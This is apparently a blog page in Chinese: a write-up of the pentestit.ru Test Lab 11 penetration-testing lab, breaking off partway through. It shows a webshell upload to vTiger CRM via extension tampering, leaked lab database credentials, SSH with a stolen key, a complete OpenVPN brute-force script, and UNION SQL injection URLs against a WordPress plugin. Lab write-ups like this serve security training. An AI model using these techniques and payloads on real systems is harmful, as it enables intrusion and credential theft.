@@ -1,0 +1,1451 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>TEST LAB 11</title>
+    <meta name="description" content="pentestit.ru的第十一期环境">
+
+    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
+    <link rel="stylesheet" href="/css/main.css ">
+    <link rel="canonical" href="http://localhost:4000/2017/11/30/Test-LAB-11/">
+    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">
+
+
+    <script>
+    // 百度统计代码
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+    </script>
+
+
+    <script>
+    // google analytics
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-111240288-1', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+
+
+</head>
+
+
+  <body>
+
+    <header id="top">
+    <div class="wrapper">
+        <a href="/" class="brand">Jirairya</a>
+        <small></small>
+        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
+        <nav id="headerNav">
+            <ul>
+                <li>
+                    
+                    <a href="/">
+                    
+                        <i class="fa fa-home"></i>Home
+                    </a>
+                </li>
+
+                
+                    
+                    <li>
+                        
+                        <a href="/archive/">
+                        
+                            <i class="fa fa-archive"></i>Archives
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/category/">
+                        
+                            <i class="fa fa-th-list"></i>Categories
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tag/">
+                        
+                            <i class="fa fa-tags"></i>Tags
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/collections/">
+                        
+                            <i class="fa fa-folder-open"></i>Collections
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/skills/">
+                        
+                            <i class="fa fa-bezier-curve"></i>Skills
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/tools/">
+                        
+                            <i class="fa fa-toolbox"></i>Tools
+                        </a>
+                    </li>
+                    
+                
+                    
+                    <li>
+                        
+                        <a href="/about/">
+                        
+                            <i class="fa fa-paper-plane"></i>About
+                        </a>
+                    </li>
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="page clearfix" post>
+    <div class="left">
+        <h1>TEST LAB 11</h1>
+        <div class="label">
+
+            <div class="label-card">
+                <i class="fa fa-calendar"></i>2017-11-30
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+                
+            </div>
+
+            <div class="label-card">
+            
+
+
+<!-- <span class="point">•</span> -->
+<span class="categories">
+  <i class="fa fa-th-list"></i>
+  
+    
+        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
+    
+        <a href="/category/#tools" title="Category: tools" rel="category">tools</a>&nbsp;
+    
+        <a href="/category/#game" title="Category: game" rel="category">game</a>
+    
+  
+
+  <!-- <span class="point">•</span> -->
+</span>
+
+
+            </div>
+
+            <div class="label-card">
+            
+<!-- <span class="point">•</span> -->
+<span class="pageTag">
+  <i class="fa fa-tags"></i>
+  
+    
+        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
+        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
+    
+        <!--a href="/tag/#ctf" title="Tag: ctf" rel="tag">ctf</a-->
+        <a href="/tag/#ctf" title="Tag: ctf" rel="tag">ctf</a>&nbsp;
+    
+        <!--a href="/tag/#pentest" title="Tag: pentest" rel="tag">pentest</a-->
+        <a href="/tag/#pentest" title="Tag: pentest" rel="tag">pentest</a>
+    
+  
+
+</span>
+
+            </div>
+
+        </div>
+        <hr>
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+        <ul id="markdown-toc">
+  <li><a href="#连接实验室vpn" id="markdown-toc-连接实验室vpn">连接实验室vpn</a>    <ul>
+      <li><a href="#kali连接vpn方法1" id="markdown-toc-kali连接vpn方法1">kali连接vpn方法1</a></li>
+      <li><a href="#kali连接vpn方法2" id="markdown-toc-kali连接vpn方法2">kali连接vpn方法2</a></li>
+      <li><a href="#kali连接vpn方法3" id="markdown-toc-kali连接vpn方法3">kali连接vpn方法3</a></li>
+      <li><a href="#windows连接vpn" id="markdown-toc-windows连接vpn">windows连接vpn</a></li>
+    </ul>
+  </li>
+  <li><a href="#攻击" id="markdown-toc-攻击">攻击</a>    <ul>
+      <li><a href="#crm-token" id="markdown-toc-crm-token">CRM Token</a></li>
+      <li><a href="#site-token" id="markdown-toc-site-token">Site TOKEN</a></li>
+      <li><a href="#ad-token" id="markdown-toc-ad-token">AD Token</a></li>
+      <li><a href="#cups-token" id="markdown-toc-cups-token">CUPS TOKEN</a></li>
+      <li><a href="#director-token" id="markdown-toc-director-token">Director Token</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p>pentestit.ru的第十一期环境</p>
+
+<!--more-->
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1511926938019.png" alt="网络拓扑图" /></p>
+
+<h2 id="连接实验室vpn">连接实验室vpn</h2>
+
+<p>连接好实验室vpn之后，<code class="highlighter-rouge">ping 192.168.101.10</code>，使用浏览器打开<code class="highlighter-rouge">192.168.101.10</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1511926583955.png" alt="" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1511926741333.png" alt="Windows连接" /></p>
+
+<h3 id="kali连接vpn方法1">kali连接vpn方法1</h3>
+
+<p>0x01 在kali上安装vpn客户端：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install network-manager-openvpn
+apt-get install network-manager-openvpn-gnome
+apt-get install network-manager-pptp
+apt-get install network-manager-pptp-gnome
+apt-get install network-manager-strongswan
+apt-get install network-manager-vpnc
+apt-get install network-manager-vpnc-gnome
+</code></pre></div></div>
+
+<p>0x02 然后直接导入<code class="highlighter-rouge">https://lab.pentestit.ru</code>下载的<code class="highlighter-rouge">.ovpn</code>文件</p>
+
+<h3 id="kali连接vpn方法2">kali连接vpn方法2</h3>
+
+<p>0x01 安装openvpn：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install openvpn
+</code></pre></div></div>
+
+<p>0x02 新建文件夹,将<code class="highlighter-rouge">lab.ovpn</code>, <code class="highlighter-rouge">pass.txt</code> 和 <code class="highlighter-rouge">ovpn.sh</code> 复制到 <code class="highlighter-rouge">/opt/pentestit/</code>：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /opt <span class="o">&amp;&amp;</span> mkdir pentestit
+</code></pre></div></div>
+
+<blockquote>
+  <p><code class="highlighter-rouge">lab.ovpn</code>文件信息如下：</p>
+</blockquote>
+
+<blockquote>
+  <p><img src="/img/game/TESTLAB/TESTLAB11/1511925706657.png" alt="ovpn" /></p>
+</blockquote>
+
+<blockquote>
+  <p><code class="highlighter-rouge">pass.txt</code>为https://lab.pentestit.ru/how-to-connect显示的账号和登陆密码。</p>
+</blockquote>
+
+<blockquote>
+  <p><code class="highlighter-rouge">ovpn.sh</code>为:</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+openvpn <span class="nt">--config</span> /opt/pentestit/lab.ovpn &amp;<span class="sb">```</span>
+</code></pre></div></div>
+
+<p>0x03 连接openvpn：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod +x /opt/pentestit/ovpn.sh
+/opt/pentestit/ovpn.sh
+</code></pre></div></div>
+
+<p>0x04 停止连接：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>killall openvpn
+</code></pre></div></div>
+
+<h3 id="kali连接vpn方法3">kali连接vpn方法3</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openvpn lab.pentestit.ru.conf
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1511926114934.png" alt="Alt text" /></p>
+
+<p>tEQGbU9pEzGj</p>
+
+<h3 id="windows连接vpn">windows连接vpn</h3>
+
+<p>0x01 到http://openvpn.net/index.php/open-source/downloads.html 下载<a href="http://openvpn.net/index.php/open-source/downloads.html">openvpn</a></p>
+
+<p>0x02 将<code class="highlighter-rouge">lab.ovpn</code>和<code class="highlighter-rouge">pass.txt</code>复制到<code class="highlighter-rouge">C:\Program Files\OpenVPN\config</code>路径下</p>
+
+<p>0x03 使用管理员权限运行openvpn，连接就行</p>
+
+<h2 id="攻击">攻击</h2>
+
+<h3 id="crm-token">CRM Token</h3>
+
+<p><strong>0x01 nmap扫描</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# service postgresql start
+
+root@kali:~# msfconsole
+....
+
+msf &gt; db_status
+[*] postgresql connected to msf
+msf &gt; db_nmap -sS -sC -sV -v -A 192.168.101.10
+...
+msf &gt; db_nmap -sS -sC -sV -v -A 192.168.101.11
+</code></pre></div></div>
+
+<blockquote>
+  <p><code class="highlighter-rouge">-sS</code></p>
+</blockquote>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512001683360.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512001627051.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512001588370.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512000399297.png" alt="Alt text" />
+<img src="/img/game/TESTLAB/TESTLAB11/1512000413560.png" alt="Alt text" />
+<img src="/img/game/TESTLAB/TESTLAB11/1512000426995.png" alt="Alt text" />
+<img src="/img/game/TESTLAB/TESTLAB11/1512000465316.png" alt="Alt text" /></p>
+
+<p><strong>0x02</strong></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512000606287.png" alt="Alt text" /></p>
+
+<p>wpscan</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan -a "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" -u 192.168.101.10
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512000128660.png" alt="Alt text" />
+<img src="/img/game/TESTLAB/TESTLAB11/1512000215076.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512001307330.png" alt="Alt text" /></p>
+
+<p>尝试sqlmap注入攻击，一直失败。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit <span class="s2">"Vtiger CRM 6.3.0"</span>
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512002296745.png" alt="Alt text" /></p>
+
+<p><a href="https://www.exploit-db.com/exploits/38345/">vTiger CRM 6.3.0 - Authenticated Remote Code Execution</a></p>
+
+<p>使用<code class="highlighter-rouge">amdin</code>账户和<code class="highlighter-rouge"> blackstar</code>的密码登陆crm后台：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512006693662.png" alt="Alt text" /></p>
+
+<p>通过<code class="highlighter-rouge">右上角设置—&gt;rm设置-&gt;模板—&gt;公司详细信息—&gt;编辑</code>上传图片<a href="https://github.com/JohnTroony/php-webshells/blob/master/b374k-mini-shell-php.php.php">shell</a>(https://github.com/JohnTroony/php-webshells/blob/master/b374k-mini-shell-php.php.php)。</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512021073980.png" alt="Alt text" /></p>
+
+<p>在上传小马的时候，通过burpsuit拦截，更改图片的文件后缀名为<code class="highlighter-rouge">php</code>，且删除小马代码中的<code class="highlighter-rouge">php</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512021141605.png" alt="Alt text" /></p>
+
+<p>上传成功，然后找到图片路径<code class="highlighter-rouge">http://192.168.101.10:88/test/logo/shell.php</code>:</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512020952603.png" alt="Alt text" /></p>
+
+<p>通过shell找到了token,token为<code class="highlighter-rouge">Give_me_all</code>:</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512020697693.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512081248950.png" alt="CRM站点的ip情况" />
+<img src="/img/game/TESTLAB/TESTLAB11/1512081704041.png" alt="Alt text" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_server'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+<span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_port'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">':3306'</span><span class="p">;</span>
+<span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_username'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'crmuser'</span><span class="p">;</span>
+<span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_password'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'PJB&amp;*24^2e2'</span><span class="p">;</span>
+<span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_name'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'testlabcrm'</span><span class="p">;</span>
+<span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_type'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
+<span class="nv">$dbconfig</span><span class="o">[</span><span class="s1">'db_status'</span><span class="o">]</span> <span class="o">=</span> <span class="s1">'true'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>本来想做进一步的攻击，但是有waf，就先做其他的了。</p>
+
+<h3 id="site-token">Site TOKEN</h3>
+
+<p>看着后台信息的邮箱，立即想到开始扫出的邮箱页面，考虑将管理员邮箱<code class="highlighter-rouge">admin@test.lab</code>作为账户登陆。将CRM后台管理员信息收集做成字典，尝试得出密码为<code class="highlighter-rouge">darthvader</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512022460798.png" alt="Alt text" /></p>
+
+<p>从邮箱中得到私钥：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512024529838.png" alt="Alt text" /></p>
+
+<p>利用私钥登陆:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop# chmod 600 officetwo.key 
+root@kali:~/Desktop# ssh <span class="nt">-i</span> /root/Desktop/officetwo.key <span class="nt">-p2222</span> tech@192.168.101.11
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512024420000.png" alt="Alt text" /></p>
+
+<p>查看ip情况：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ip addr show
+</code></pre></div></div>
+
+<p>查看文件情况，寻找有用的信息：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512066180000.png" alt="查看隐藏文件" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512024635531.png" alt="Alt text" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512025314177.png" alt="Alt text" /></p>
+
+<p>查看具有root权限的进程：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | <span class="nb">grep </span>root
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512064932126.png" alt="Alt text" /></p>
+
+<p>查看</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512065566386.png" alt="Alt text" /></p>
+
+<p>打印路由:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-nr</span>
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512065673171.png" alt="打印路由" /></p>
+
+<p>在<code class="highlighter-rouge">/etc/openvpn/</code>找到了<code class="highlighter-rouge">.conf</code>文件：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512068918798.png" alt="office-2用户" /></p>
+
+<p>知道了账户可能为<code class="highlighter-rouge">Office-2</code>,openvpn连接的ip为<code class="highlighter-rouge">192.168.101.10</code> ，端口为<code class="highlighter-rouge">1194</code>。</p>
+
+<p>查看<code class="highlighter-rouge">/opt/openvpn/auth.txt</code>，没有权限：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512069026741.png" alt="Alt text" /></p>
+
+<p>使用<code class="highlighter-rouge">openvpn --config server.conf</code>登陆还需要密码，立即进行下一步——找密码。</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512069536329.png" alt="Alt text" /></p>
+
+<p>然后直接使用<code class="highlighter-rouge">ls -alhR /var/</code>大概查看一下目录和文件情况，果然有发现。查看敏感信息的文件，找到了openvpn的爆破脚本、字典，再根据上面找到了的<code class="highlighter-rouge">openvpn --config server.conf</code>文件进行爆破：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512071802501.png" alt="Alt text" /></p>
+
+<p><em>爆破脚本：</em></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="c"># By Galkan </span>
+
+<span class="nv">openvpn_binary_path</span><span class="o">=</span><span class="s2">"/usr/sbin/openvpn"</span>
+
+<span class="k">function </span>brute_force<span class="o">()</span>
+<span class="o">{</span>
+    <span class="nv">brute_file</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span>mktemp /tmp/brute_force_openvpn_<span class="nv">$USER</span>.XXXXXX<span class="sb">`</span><span class="s2">"</span>
+    <span class="nv">output_file</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span>mktemp /tmp/brute_force_openvpn_<span class="nv">$USER</span>.XXXXXX<span class="sb">`</span><span class="s2">"</span>
+
+    rm <span class="nt">-f</span> <span class="nv">$brute_file</span> <span class="nv">$output_file</span>
+
+    <span class="nv">user_name</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+    <span class="nv">password</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
+
+    <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$user_name</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$brute_file</span><span class="s2">"</span>
+    <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$password</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> <span class="s2">"</span><span class="nv">$brute_file</span><span class="s2">"</span>
+
+    <span class="nv">$openvpn_binary_path</span> <span class="nt">--config</span> <span class="nv">$openvpn_config_file</span> <span class="nt">--auth-user-pass</span> <span class="s2">"</span><span class="nv">$brute_file</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nv">$output_file</span> &amp;
+    
+    <span class="k">while</span> <span class="o">[</span> 1 <span class="o">]</span>
+    <span class="k">do
+        if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$output_file</span><span class="s2">"</span> <span class="o">]</span>
+        <span class="k">then
+            </span><span class="nb">cat</span> <span class="nv">$output_file</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"Options error"</span>
+            <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+            <span class="k">then
+                </span><span class="nb">echo</span> <span class="s2">"ERROR: </span><span class="sb">`</span><span class="nb">cat</span> <span class="nv">$output_file</span> | <span class="nb">grep</span> <span class="s2">"Options error"</span><span class="sb">`</span><span class="s2">"</span>
+                <span class="nb">break
+            </span><span class="k">fi
+
+            </span><span class="nb">cat</span> <span class="nv">$output_file</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"SIGTERM</span><span class="se">\[</span><span class="s2">soft,auth-failure</span><span class="se">\]</span><span class="s2"> received, process exiting"</span> 
+            <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+            <span class="k">then
+                </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$user_name</span><span class="s2">:</span><span class="nv">$password</span><span class="s2"> -&gt; FAILURE"</span>
+                <span class="nb">break   
+            </span><span class="k">fi
+
+            </span><span class="nb">cat</span> <span class="nv">$output_file</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"Initialization Sequence Completed"</span> 
+            <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+            <span class="k">then
+                </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$user_name</span><span class="s2">:</span><span class="nv">$password</span><span class="s2"> -&gt; SUCCESS"</span>
+                <span class="nb">break   
+            </span><span class="k">fi
+        else
+            continue
+        fi
+    done
+    
+    </span><span class="nv">openvpn_pid</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span>pidof openvpn<span class="sb">`</span><span class="s2">"</span>
+    
+
+    rm <span class="nt">-f</span> <span class="nv">$brute_file</span> <span class="nv">$output_file</span> 
+<span class="o">}</span>
+
+
+
+<span class="k">function </span>main<span class="o">()</span>
+<span class="o">{</span>
+    <span class="nv">dict_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+
+    <span class="k">for </span>vpn_file <span class="k">in</span> <span class="nv">$openvpn_binary_path</span> <span class="nv">$openvpn_config_file</span> <span class="nv">$dict_file</span>
+    <span class="k">do
+        if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$vpn_file</span><span class="s2">"</span> <span class="o">]</span>
+        <span class="k">then
+            </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$vpn_file</span><span class="s2"> : Dosyasi Sistemde Bulunamadi !!!"</span>
+            <span class="nb">exit </span>3
+        <span class="k">fi
+    done
+
+
+    </span><span class="nb">cat</span> <span class="nv">$dict_file</span> | <span class="k">while </span><span class="nb">read</span> <span class="nt">-r</span> line
+    <span class="k">do
+        </span><span class="nv">user_name</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span> | cut <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f1</span><span class="sb">`</span><span class="s2">"</span>
+        <span class="nv">password</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$line</span><span class="s2">"</span> | cut <span class="nt">-d</span> <span class="s2">":"</span> <span class="nt">-f2</span><span class="sb">`</span><span class="s2">"</span>
+
+        <span class="nv">result</span><span class="o">=</span><span class="s2">"</span><span class="sb">`</span>brute_force <span class="s2">"</span><span class="nv">$user_name</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$password</span><span class="s2">"</span><span class="sb">`</span><span class="s2">"</span>
+        <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$result</span><span class="s2">"</span>
+
+        <span class="nb">echo</span> <span class="s2">"</span><span class="nv">$result</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-Eq</span> <span class="s2">"^ERROR"</span>
+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span>
+        <span class="k">then
+            </span><span class="nb">break
+        </span><span class="k">fi  
+    done</span>
+<span class="o">}</span>
+
+
+
+<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nv">$# </span><span class="nt">-eq</span> 2 <span class="o">]</span>
+<span class="k">then
+    </span><span class="nb">echo</span> <span class="s2">"Kullanim: </span><span class="nv">$0</span><span class="s2"> &lt;dict_file&gt; &lt;vpn_config_file&gt;"</span>
+    <span class="nb">exit </span>1
+<span class="k">else
+    </span><span class="nv">dict_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
+    <span class="nv">openvpn_config_file</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
+
+    main <span class="s2">"</span><span class="nv">$dict_file</span><span class="s2">"</span> 
+<span class="k">fi</span>
+</code></pre></div></div>
+
+<p>不过在<code class="highlighter-rouge">/var/tmp/.6469636d</code>中找到了<code class="highlighter-rouge">aut.txt</code>,和刚才爆破结果一样密码是<code class="highlighter-rouge">starswars</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512070950168.png" alt="Alt text" /></p>
+
+<p>连接第二层openvpn,从<code class="highlighter-rouge">192.168.101.0/24</code>进入了<code class="highlighter-rouge">172.16.0.0</code>：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512072622127.png" alt="Alt text" /></p>
+
+<p>目前进入网络拓扑图：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512072794228.png" alt="Alt text" /></p>
+
+<p>使用<a href="http://www.lijiejie.com/nmap-fast-scan-large-networks/">nmap高并发的扫描</a>方法进行扫描：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nmap <span class="nt">-v</span> <span class="nt">-sn</span> <span class="nt">-PE</span> <span class="nt">-n</span> <span class="nt">--min-hostgroup</span> 1024 <span class="nt">--min-parallelism</span> 1024 <span class="nt">-oX</span> nmap_172_output.xml 172.16.0.0/24
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512078083694.png" alt="172段存活的机器" /></p>
+
+<p>使用msf调用nmap模块扫描：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf <span class="o">&gt;</span> db_nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-v</span> <span class="nt">-A</span> 172.16.0.10-18
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512079415856.png" alt="msf中列出服务" /></p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512079433114.png" alt="msf列出主机" /></p>
+
+<p>结合网络拓扑图看：</p>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512080752833.png" alt="网络拓扑图" /></p>
+
+<ul>
+  <li><strong>AD</strong>:<code class="highlighter-rouge">172.16.0.10</code></li>
+  <li><strong>CRM:</strong>:<code class="highlighter-rouge">172.16.0.12</code>和<code class="highlighter-rouge">192.168.101.10</code></li>
+  <li><strong>CUPS:</strong><code class="highlighter-rouge">172.16.0.14</code></li>
+  <li><strong>ACCESS CONTROL:</strong><code class="highlighter-rouge">172.16.0.16</code>和<code class="highlighter-rouge">172.16.0.17</code></li>
+</ul>
+
+<p>根据端口扫描情况，还是从web开始着手，即<code class="highlighter-rouge">172.16.0.11</code>。该站点和之前的<code class="highlighter-rouge">192.168.101.10</code>的wordpress站点一样的，都有kittycatfish2.2插件，目测内网内没有waf，不像公网上的那个站点一样。尝试sql注入。</p>
+
+<p>猜字段：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad<span class="o">=</span>16%20order%20by%203--%20-
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512116084454.png" alt="Alt text" /></p>
+
+<p>报错为3，即字段是<code class="highlighter-rouge">2</code>。</p>
+
+<p>知道字段之后，利用联合查询。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad<span class="o">=</span>16+union+select+0x6b635f61645f637373,%28SELECT%20GROUP_CONCAT%28table_name%29%20FROM%20information_schema.tables%20WHERE%20table_schema<span class="o">=</span>database%28%29%20GROUP%20BY%20table_name%20LIMIT%200,1%29
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512195065290.png" alt="Alt text" /></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://172.16.0.11/wp-content/plugins/kittycatfish-2.2/base.css.php?kc_ad=16+union+select+0x6b635f61645f637373,(SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name=0x746c5f746f6b656e%20GROUP%20BY%20table_name%20LIMIT%200,1)
+</code></pre></div></div>
+
+<p><img src="/img/game/TESTLAB/TESTLAB11/1512195093599.png" alt="Alt text" /></p>
+
